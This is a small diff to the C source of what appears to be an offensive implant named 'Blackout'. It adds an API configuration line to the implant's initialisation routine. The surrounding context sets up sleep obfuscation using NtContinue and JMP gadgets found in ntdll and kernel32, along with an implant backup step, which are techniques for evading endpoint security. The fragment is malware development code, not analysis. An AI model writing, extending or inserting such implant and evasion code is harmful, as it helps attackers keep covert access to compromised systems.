@@ -216,6 +216,7 @@ FUNC VOID BlackoutInit(
     CreateImplantBackup();
 #endif
 
+    Blackout().bkApi                     = _BK_API_;
     Blackout().SleepObf.Technique        = _BK_SLEEP_OBF_; 
     Blackout().SleepObf.NtContinueGadget = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
     Blackout().SleepObf.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, 0x23 );
